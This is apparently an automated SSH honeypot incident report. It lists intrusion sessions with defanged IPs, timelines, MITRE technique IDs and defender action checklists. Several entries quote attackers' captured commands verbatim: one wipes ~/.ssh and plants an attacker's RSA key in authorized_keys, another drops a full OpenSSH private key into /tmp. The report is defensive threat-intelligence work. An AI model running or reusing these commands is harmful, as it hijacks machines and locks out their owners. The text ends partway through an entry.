### 🔴 HIGH · IR-758c65983da8

| Field | Detail |
|---|---|
| **Source IP** | `4.157.250[.]195` |
| **First Seen** | 2026-09-07 19:14 |
| **Last Seen** | 2026-09-07 19:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:14:10` | `cowrie.session.connect` |
| `2026-09-07 19:14:10` | `cowrie.client.version` |
| `2026-09-07 19:14:10` | `cowrie.client.kex` |
| `2026-09-07 19:14:10` | `cowrie.login.success` |
| `2026-09-07 19:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.157.250[.]195` to AbuseIPDB if not already reported
- [ ] Block `4.157.250[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df5737030da

| Field | Detail |
|---|---|
| **Source IP** | `4.157.250[.]195` |
| **First Seen** | 2026-09-07 19:14 |
| **Last Seen** | 2026-09-07 19:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:14:10` | `cowrie.session.connect` |
| `2026-09-07 19:14:10` | `cowrie.client.version` |
| `2026-09-07 19:14:10` | `cowrie.client.kex` |
| `2026-09-07 19:14:10` | `cowrie.login.success` |
| `2026-09-07 19:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.157.250[.]195` to AbuseIPDB if not already reported
- [ ] Block `4.157.250[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40908c4fd85c

| Field | Detail |
|---|---|
| **Source IP** | `45.78.235[.]121` |
| **First Seen** | 2026-09-07 19:14 |
| **Last Seen** | 2026-09-07 19:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:14:50` | `cowrie.session.connect` |
| `2026-09-07 19:14:50` | `cowrie.client.version` |
| `2026-09-07 19:14:50` | `cowrie.client.kex` |
| `2026-09-07 19:14:51` | `cowrie.login.success` |
| `2026-09-07 19:14:52` | `cowrie.session.params` |
| `2026-09-07 19:14:52` | `cowrie.command.input` |
| `2026-09-07 19:14:52` | `cowrie.command.failed` |
| `2026-09-07 19:14:53` | `cowrie.log.closed` |
| `2026-09-07 19:14:53` | `cowrie.session.params` |
| `2026-09-07 19:14:53` | `cowrie.command.input` |
| `2026-09-07 19:14:54` | `cowrie.session.file_download` |
| `2026-09-07 19:14:54` | `cowrie.log.closed` |
| `2026-09-07 19:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.235[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.78.235[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-430aa144ccdc

| Field | Detail |
|---|---|
| **Source IP** | `45.78.235[.]121` |
| **First Seen** | 2026-09-07 19:14 |
| **Last Seen** | 2026-09-07 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:14:54` | `cowrie.session.connect` |
| `2026-09-07 19:14:54` | `cowrie.client.version` |
| `2026-09-07 19:14:54` | `cowrie.client.kex` |
| `2026-09-07 19:14:55` | `cowrie.login.success` |
| `2026-09-07 19:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.235[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.78.235[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d633b01c0fc7

| Field | Detail |
|---|---|
| **Source IP** | `45.78.235[.]121` |
| **First Seen** | 2026-09-07 19:14 |
| **Last Seen** | 2026-09-07 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:14:56` | `cowrie.session.connect` |
| `2026-09-07 19:14:56` | `cowrie.client.version` |
| `2026-09-07 19:14:56` | `cowrie.client.kex` |
| `2026-09-07 19:14:57` | `cowrie.login.success` |
| `2026-09-07 19:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.235[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.78.235[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68766d0f6cc6

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-07 19:18 |
| **Last Seen** | 2026-09-07 19:18 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:18:28` | `cowrie.session.connect` |
| `2026-09-07 19:18:28` | `cowrie.client.version` |
| `2026-09-07 19:18:28` | `cowrie.client.kex` |
| `2026-09-07 19:18:29` | `cowrie.login.success` |
| `2026-09-07 19:18:34` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:18:37` | `cowrie.direct-tcpip.ja4` |
| `2026-09-07 19:18:37` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:18:40` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:18:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-07 19:18:41` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:18:44` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:18:46` | `cowrie.direct-tcpip.ja4` |
| `2026-09-07 19:18:46` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c7fc2afb7e

| Field | Detail |
|---|---|
| **Source IP** | `160.250.93[.]239` |
| **First Seen** | 2026-09-07 19:20 |
| **Last Seen** | 2026-09-07 19:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:20:13` | `cowrie.session.connect` |
| `2026-09-07 19:20:13` | `cowrie.client.version` |
| `2026-09-07 19:20:14` | `cowrie.client.kex` |
| `2026-09-07 19:20:17` | `cowrie.login.success` |
| `2026-09-07 19:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.250.93[.]239` to AbuseIPDB if not already reported
- [ ] Block `160.250.93[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d60f4f0f6d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-07 19:20 |
| **Last Seen** | 2026-09-07 19:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:20:19` | `cowrie.session.connect` |
| `2026-09-07 19:20:19` | `cowrie.client.version` |
| `2026-09-07 19:20:19` | `cowrie.client.kex` |
| `2026-09-07 19:20:19` | `cowrie.login.success` |
| `2026-09-07 19:20:20` | `cowrie.session.params` |
| `2026-09-07 19:20:20` | `cowrie.command.input` |
| `2026-09-07 19:20:21` | `cowrie.session.file_download` |
| `2026-09-07 19:20:21` | `cowrie.session.file_download` |
| `2026-09-07 19:20:21` | `cowrie.log.closed` |
| `2026-09-07 19:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-650833d64e9f

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-07 19:23 |
| **Last Seen** | 2026-09-07 19:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:23:33` | `cowrie.session.connect` |
| `2026-09-07 19:23:33` | `cowrie.client.version` |
| `2026-09-07 19:23:33` | `cowrie.client.kex` |
| `2026-09-07 19:23:33` | `cowrie.login.success` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-07 19:23:36` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e05e2f5286d

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]84` |
| **First Seen** | 2026-09-07 19:33 |
| **Last Seen** | 2026-09-07 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:33:22` | `cowrie.session.connect` |
| `2026-09-07 19:33:22` | `cowrie.client.version` |
| `2026-09-07 19:33:22` | `cowrie.client.kex` |
| `2026-09-07 19:33:23` | `cowrie.login.success` |
| `2026-09-07 19:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ff7f7f2bb7

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-09-07 19:37 |
| **Last Seen** | 2026-09-07 19:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:37:14` | `cowrie.session.connect` |
| `2026-09-07 19:37:14` | `cowrie.client.version` |
| `2026-09-07 19:37:14` | `cowrie.client.kex` |
| `2026-09-07 19:37:15` | `cowrie.login.success` |
| `2026-09-07 19:37:16` | `cowrie.session.params` |
| `2026-09-07 19:37:16` | `cowrie.command.input` |
| `2026-09-07 19:37:16` | `cowrie.command.failed` |
| `2026-09-07 19:37:16` | `cowrie.log.closed` |
| `2026-09-07 19:37:17` | `cowrie.session.params` |
| `2026-09-07 19:37:17` | `cowrie.command.input` |
| `2026-09-07 19:37:18` | `cowrie.session.file_download` |
| `2026-09-07 19:37:18` | `cowrie.log.closed` |
| `2026-09-07 19:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba52f802c61

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-09-07 19:37 |
| **Last Seen** | 2026-09-07 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:37:18` | `cowrie.session.connect` |
| `2026-09-07 19:37:18` | `cowrie.client.version` |
| `2026-09-07 19:37:18` | `cowrie.client.kex` |
| `2026-09-07 19:37:19` | `cowrie.login.success` |
| `2026-09-07 19:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961ed677b2e4

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-09-07 19:37 |
| **Last Seen** | 2026-09-07 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:37:19` | `cowrie.session.connect` |
| `2026-09-07 19:37:19` | `cowrie.client.version` |
| `2026-09-07 19:37:20` | `cowrie.client.kex` |
| `2026-09-07 19:37:20` | `cowrie.login.success` |
| `2026-09-07 19:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d845bfeec3

| Field | Detail |
|---|---|
| **Source IP** | `118.196.119[.]108` |
| **First Seen** | 2026-09-07 19:39 |
| **Last Seen** | 2026-09-07 19:44 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:39:14` | `cowrie.session.connect` |
| `2026-09-07 19:39:14` | `cowrie.client.version` |
| `2026-09-07 19:39:15` | `cowrie.client.kex` |
| `2026-09-07 19:39:16` | `cowrie.login.success` |
| `2026-09-07 19:39:16` | `cowrie.session.params` |
| `2026-09-07 19:39:16` | `cowrie.command.input` |
| `2026-09-07 19:39:16` | `cowrie.command.failed` |
| `2026-09-07 19:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.119[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.196.119[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe4e5db299ae

| Field | Detail |
|---|---|
| **Source IP** | `118.196.119[.]108` |
| **First Seen** | 2026-09-07 19:39 |
| **Last Seen** | 2026-09-07 19:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:39:44` | `cowrie.session.connect` |
| `2026-09-07 19:39:44` | `cowrie.client.version` |
| `2026-09-07 19:39:44` | `cowrie.client.kex` |
| `2026-09-07 19:39:45` | `cowrie.login.success` |
| `2026-09-07 19:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.119[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.196.119[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e05e6d6814

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-07 19:39 |
| **Last Seen** | 2026-09-07 19:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:39:49` | `cowrie.session.connect` |
| `2026-09-07 19:39:50` | `cowrie.client.version` |
| `2026-09-07 19:39:50` | `cowrie.client.kex` |
| `2026-09-07 19:39:53` | `cowrie.login.success` |
| `2026-09-07 19:39:55` | `cowrie.direct-tcpip.request` |
| `2026-09-07 19:39:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-07 19:39:57` | `cowrie.direct-tcpip.data` |
| `2026-09-07 19:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c73d78c08eb

| Field | Detail |
|---|---|
| **Source IP** | `155.94.233[.]59` |
| **First Seen** | 2026-09-07 19:41 |
| **Last Seen** | 2026-09-07 19:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:41:22` | `cowrie.session.connect` |
| `2026-09-07 19:41:22` | `cowrie.client.version` |
| `2026-09-07 19:41:22` | `cowrie.client.kex` |
| `2026-09-07 19:41:22` | `cowrie.login.success` |
| `2026-09-07 19:41:23` | `cowrie.session.params` |
| `2026-09-07 19:41:23` | `cowrie.command.input` |
| `2026-09-07 19:41:23` | `cowrie.command.failed` |
| `2026-09-07 19:41:23` | `cowrie.log.closed` |
| `2026-09-07 19:41:24` | `cowrie.session.params` |
| `2026-09-07 19:41:24` | `cowrie.command.input` |
| `2026-09-07 19:41:24` | `cowrie.session.file_download` |
| `2026-09-07 19:41:24` | `cowrie.log.closed` |
| `2026-09-07 19:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.94.233[.]59` to AbuseIPDB if not already reported
- [ ] Block `155.94.233[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0314fea7999e

| Field | Detail |
|---|---|
| **Source IP** | `155.94.233[.]59` |
| **First Seen** | 2026-09-07 19:41 |
| **Last Seen** | 2026-09-07 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:41:24` | `cowrie.session.connect` |
| `2026-09-07 19:41:24` | `cowrie.client.version` |
| `2026-09-07 19:41:24` | `cowrie.client.kex` |
| `2026-09-07 19:41:24` | `cowrie.login.success` |
| `2026-09-07 19:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.94.233[.]59` to AbuseIPDB if not already reported
- [ ] Block `155.94.233[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515f3e158a25

| Field | Detail |
|---|---|
| **Source IP** | `155.94.233[.]59` |
| **First Seen** | 2026-09-07 19:41 |
| **Last Seen** | 2026-09-07 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:41:25` | `cowrie.session.connect` |
| `2026-09-07 19:41:25` | `cowrie.client.version` |
| `2026-09-07 19:41:25` | `cowrie.client.kex` |
| `2026-09-07 19:41:25` | `cowrie.login.success` |
| `2026-09-07 19:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.94.233[.]59` to AbuseIPDB if not already reported
- [ ] Block `155.94.233[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68138572f4c5

| Field | Detail |
|---|---|
| **Source IP** | `177.30.68[.]202` |
| **First Seen** | 2026-09-07 19:42 |
| **Last Seen** | 2026-09-07 19:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:42:53` | `cowrie.session.connect` |
| `2026-09-07 19:42:53` | `cowrie.client.version` |
| `2026-09-07 19:42:53` | `cowrie.client.kex` |
| `2026-09-07 19:42:54` | `cowrie.login.success` |
| `2026-09-07 19:42:55` | `cowrie.session.params` |
| `2026-09-07 19:42:55` | `cowrie.command.input` |
| `2026-09-07 19:42:55` | `cowrie.command.failed` |
| `2026-09-07 19:42:55` | `cowrie.log.closed` |
| `2026-09-07 19:42:56` | `cowrie.session.params` |
| `2026-09-07 19:42:56` | `cowrie.command.input` |
| `2026-09-07 19:42:56` | `cowrie.session.file_download` |
| `2026-09-07 19:42:56` | `cowrie.log.closed` |
| `2026-09-07 19:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.30.68[.]202` to AbuseIPDB if not already reported
- [ ] Block `177.30.68[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8102b6c1ab2a

| Field | Detail |
|---|---|
| **Source IP** | `177.30.68[.]202` |
| **First Seen** | 2026-09-07 19:42 |
| **Last Seen** | 2026-09-07 19:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:42:56` | `cowrie.session.connect` |
| `2026-09-07 19:42:56` | `cowrie.client.version` |
| `2026-09-07 19:42:56` | `cowrie.client.kex` |
| `2026-09-07 19:42:56` | `cowrie.login.success` |
| `2026-09-07 19:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.30.68[.]202` to AbuseIPDB if not already reported
- [ ] Block `177.30.68[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9ba0f5064e

| Field | Detail |
|---|---|
| **Source IP** | `177.30.68[.]202` |
| **First Seen** | 2026-09-07 19:42 |
| **Last Seen** | 2026-09-07 19:42 |
| **Session Duration** | 0s |
